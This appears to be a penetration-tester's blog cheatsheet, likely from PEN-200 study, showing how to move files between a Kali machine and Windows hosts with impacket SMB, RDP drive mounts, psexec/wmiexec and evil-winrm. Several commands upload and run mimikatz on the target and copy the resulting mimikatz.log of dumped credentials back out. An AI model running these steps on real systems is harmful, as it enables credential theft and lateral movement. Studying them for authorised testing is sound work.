---
layout: post
title: Windows to Linux File Transfers
tag: [cheatsheet]
---

![](https://imgs.xkcd.com/comics/file_transfer.png)
_A relevant xkcd comic for your pleasure._

Transferring files from windows to linux can be annoying. Anyway you do it requires remembering some command line options for whatever tool you're using, which is why this post is being made as a reference for myself.

Here are the methods:

## SMB: 
Start server on linux:
```bash
impacket-smbserver MyShareName . -smb2support  -username USERNAME -password PASSWORD
```

then in Windows:
```powershell
net use m: \\Kali_IP\MyShareName /user:USERNAME PASSWORD

copy \path\to\local\file m:\
```

## RDP: Mounting Shared Folders
### xfreerdp
Linux:
```bash
xfreerdp /cert-ignore /compression /auto-reconnect /u:USERNAME /p:PASSWORD /v:192.168.212.250 /w:1600 /h:800 /drive:test,/home/kali/Documents/pen-200
```

Windows:
```powershell
copy mimikatz.log \\tsclient\test\mimikatz.log
```

### rdesktop

Linux:
```bash
rdesktop -z -P -x m -u USERNAME -p PASSWORD XXX.XXX.XXX.XXX -r disk:test=/home/kali/Documents/
```

Windows:
```powershell
copy mimikatz.log \\tsclient\test\mimikatz.log
```

## smpacket tools
> `psexec` and `wmiexec` are shipped with built in feature for file transfer.
{: .prompt-info}

> **Note**: By default whether you upload (lput) or download (lget) a file, it'll be writte in `C:\Windows` path.
{: .prompt-info}

Uploading mimikatz.exe to the target machine:
```powershell
lput mimikatz.exe

cd C:\windows

dir /b mimikatz.exe

mimikatz.exe
```

Downloading mimikatz.log:

```bash
lget mimikatz.log
```

## Evil-winrm

Uploading files:
```bash
upload mimikatz.exe C:\windows\tasks\mimikatz.exe
```

Downloading files:
```bash
download mimikatz.log /home/kali/Documents
```
